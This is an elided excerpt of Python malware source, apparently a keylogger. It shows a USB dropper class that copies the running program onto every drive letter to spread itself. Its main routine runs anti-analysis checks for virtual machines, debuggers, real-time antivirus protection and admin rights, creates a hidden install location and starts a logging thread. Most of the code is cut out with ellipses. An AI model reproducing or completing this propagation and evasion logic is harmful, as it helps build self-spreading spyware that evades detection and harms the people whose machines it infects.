...
class UsbDropper:
    ...
    def usbdropper(self):
        ...
        for Drives in self.DRIVELETTERS:
            try:
                copy(self.MYCURRENTLOCATION, Drives+"\\")
...
def main():
    ...
    ANTIANALYSIS.OperatingSystemCheck(), ANTIANALYSIS.ReleaseCheck(), ANTIANALYSIS.VirtualMachineCheck(), ANTIANALYSIS.DebuggerCheck(), ANTIANALYSIS.RealTimeProtectionCheck(), ANTIANALYSIS.IsUsrAdmin()

    HIDEOUTCREATION = HideOutCreation()
    
    HIDEOUTCREATION.PathCreation(), HIDEOUTCREATION.Hiding()

    LOGGINGTHREAD = Thread(target = Logging(), args = (10, )), LOGGINGTHREAD.start()
    ...
    USBDROPPER.privilegecheck(), USBDROPPER.usbdropper()
